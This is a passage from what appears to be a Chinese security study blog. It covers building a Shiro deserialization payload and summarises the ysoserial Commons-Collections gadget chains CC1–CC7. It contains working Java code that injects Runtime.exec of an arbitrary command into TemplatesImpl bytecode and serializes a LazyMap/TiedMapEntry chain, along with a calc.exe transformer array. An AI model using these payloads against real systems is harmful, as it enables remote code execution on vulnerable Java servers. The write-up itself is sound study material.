id="解决TemplatesImpl的部分"><a href="#解决TemplatesImpl的部分" class="headerlink" title="解决TemplatesImpl的部分"></a>解决TemplatesImpl的部分</h4><p>我直接参照ysoserial的createTemplateImpl方法写</p><p>可以看到ysoserial的痕迹还是很足的,但是不影响它的可读性和好用性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">createTemplatesImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="comment">//修改Neo类，插入command，创建恶意字节码，此处参考ysoserial</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span>  <span class="variable">clazz</span> <span class="operator">=</span> pool.getCtClass(Neo.class.getName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">            <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我把原来ysoserial它修改字节码的基类自己重写了一个Neo类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Neo</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">(DOM document, SerializationHandler[] handlers )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="构造攻击链"><a href="#构造攻击链" class="headerlink" title="构造攻击链"></a>构造攻击链</h4><p>然后写getPayload方法</p><p>也可以参照ysoserial写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getPayload(String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getClass方法占位，之后换成newTransformer</span></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, templatesImpl);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">finalMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    finalMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">    outerMap.clear();</span><br><span class="line">    setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">    oos.writeObject(finalMap);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406022837-asevmym.png" alt="image.png"></p><p>成功哈</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇其实开了个头,关于shiro还有很多攻击方法和知识.也算是稍微回顾了一下之前学的cc中的知识,感觉还是不错的</p><p>积累了LazyMap的新攻击姿势,这里mark一下</p><p>困死了,睡觉睡觉</p><h1 id="参考-amp-好文"><a href="#参考-amp-好文" class="headerlink" title="参考&amp;好文"></a>参考&amp;好文</h1><p><a href="http://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B">http://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B</a></p>]]></content>
    
    
    <summary type="html">shiro反序列化初探</summary>
    
    
    
    <category term="javaSec" scheme="https://xianbeil.github.io/categories/javaSec/"/>
    
    
    <category term="shiro" scheme="https://xianbeil.github.io/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>Ysoserial ACC总结</title>
    <link href="https://xianbeil.github.io/2022/04/04/cc%E6%80%BB%E7%BB%93/"/>
    <id>https://xianbeil.github.io/2022/04/04/cc%E6%80%BB%E7%BB%93/</id>
    <published>2022-04-03T18:31:08.000Z</published>
    <updated>2022-04-22T10:40:08.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>调试完了Ysoserial中Apache-Commons-Collections的七条链子，对其进行简单总结。</p><p>分为三大模块</p><ul><li>Gaget Chains——直观的把每个链子的调用情况列出来</li><li>基础类——其中常见的类与方法，是实现关键调用的子弹</li><li>反序列化时重写了readObject方法的类——一般为链子的开头部分，有了它才能完成反序列化调用</li></ul><h1 id="蓝图——Gaget-Chains"><a href="#蓝图——Gaget-Chains" class="headerlink" title="蓝图——Gaget Chains"></a>蓝图——Gaget Chains</h1><p>简要回顾一下这七条Gaget Chain</p><blockquote><p>下文中提到的“攻击链”为一部分固定的连续调用方法，我自个儿起的名字。因为是固定且多次出现所以这样方便称呼。</p></blockquote><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>入口为<code>AnnotationInvocationHandler.readObject()</code></p><p>通过<code>LazyMap</code>攻击链</p><p>最后通过<code>TransformerMap</code>攻击链完成反射方法调用</p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>入口为<code>PriorityQueue</code>，也就是优先队列的readObject方法</p><p>在排序的时候可以控制comparator</p><p>最后实际上是触发，TemplatesImpl攻击链</p><p>也就是通过加载字节码来执行恶意代码</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">加载静态块恶意代码</span><br></pre></td></tr></table></figure><p>入口为<code>AnnotationInvocationHandler.readObject()</code></p><p>其中通过<code>LazyMap</code>攻击链</p><p>最后加载了<code>TemplatesImpl</code>攻击链</p><p>加载字节码执行恶意代码</p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">加载静态块恶意代码</span><br></pre></td></tr></table></figure><p>入口为<code>PriorityQueue.readObject()</code></p><p>与CC2不同的是，他触发的是<code>InstantiateTransformer.transform()</code>，也就和CC3一样</p><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">      BadAttributeValueExpException.readObject()</span><br><span class="line">          TiedMapEntry.toString()</span><br><span class="line">              LazyMap.get()</span><br><span class="line">                  ChainedTransformer.transform()</span><br><span class="line">                      ConstantTransformer.transform()</span><br><span class="line">                      InvokerTransformer.transform()</span><br><span class="line">                          Method.invoke()</span><br><span class="line">                              Class.getMethod()</span><br><span class="line">                      InvokerTransformer.transform()</span><br><span class="line">                          Method.invoke()</span><br><span class="line">                              Runtime.getRuntime()</span><br><span class="line">                      InvokerTransformer.transform()</span><br><span class="line">                         Method.invoke()</span><br><span class="line">                              Runtime.exec()</span><br></pre></td></tr></table></figure><p>入口为<code>BadAttributeValueExpException.readObject()</code></p><p>通过<code>TiedMapEntry.toString()</code>方法</p><p>触发<code>LazyMap</code>攻击链</p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">java.util.HashMap.readObject()</span><br><span class="line">java.util.HashMap.hash()</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line"> java.lang.reflect.Method.invoke()</span><br><span class="line"> java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p>适用JDK8u71及之后</p><p>入口为<code>HashMap.readObject()</code></p><p>来触发<code>TiedMapEntry.hashCode()</code></p><p>最后触发<code>LazyMap</code>攻击链</p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br></pre></td></tr></table></figure><p>入口为<code>Hashtable.readObject</code>，其中触发哈希碰撞</p><p>从而触发<code>AbstractMapDecorator.equals</code>方法</p><p>最终调用<code>LazyMap</code>攻击链</p><h1 id="子弹——常见类与方法"><a href="#子弹——常见类与方法" class="headerlink" title="子弹——常见类与方法"></a>子弹——常见类与方法</h1><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>org.apache.commons.collections.functors.ConstantTransformer</p><p>ysoserial中最常见的构造方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br></pre></td></tr></table></figure><p>这个类的主要就是transform方法，返回<code>iConstant</code>属性，一般为transformer数组中第一个元素，为<code>ChainedTransformer</code>的transform方法第一个调用的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="InvokeTransformer"><a href="#InvokeTransformer" class="headerlink" title="InvokeTransformer"></a>InvokeTransformer</h2><p>org.apache.commons.collections.functors.InvokeTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transformer数组中反射调用方法的关键类，transform方法实现了反射调用。</p><p>构造函数要求传入方法名，方法需要参数类型，具体参数</p><p>transform方法反射执行一个类的一个特定方法</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>org.apache.commons.collections.functors.ChainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造方法可以传入一个transformers数组</p><p>transform方法实现了数组中的递归调用，前一个元素transform方法的返回值为后一个元素transform方法的参数</p><p>因此一般我们这样构造transformer数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>).invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]).exec(<span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure><p>以上三个transformer通过组合可以完整调用命令执行，入口为<code>ChainedTransformer.transform()</code></p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>org.apache.commons.collections.map.LazyMap</p><p>ysoserial中常见的构造方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 